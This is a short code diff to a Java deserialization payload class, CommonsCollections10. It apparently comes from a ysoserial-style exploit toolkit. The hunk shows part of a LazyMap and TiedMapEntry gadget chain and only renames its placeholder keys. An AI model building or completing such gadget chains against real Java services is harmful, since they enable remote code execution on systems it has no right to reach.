@@ -32,13 +32,13 @@ public class CommonsCollections10 implements ObjectPayload<Object> {
         Map     innerMap = new HashMap();
         LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
 
-        TiedMapEntry tme    = new TiedMapEntry(outerMap, "su18");
+        TiedMapEntry tme    = new TiedMapEntry(outerMap, "nu1r");
         Map          expMap = new HashMap();
-        expMap.put(tme, "su19");
+        expMap.put(tme, "nu2r");
 
         setFieldValue(outerMap, "factory", factoryTransformer);
 
-        outerMap.remove("su18");
+        outerMap.remove("nu1r");
 
         return expMap;
     }
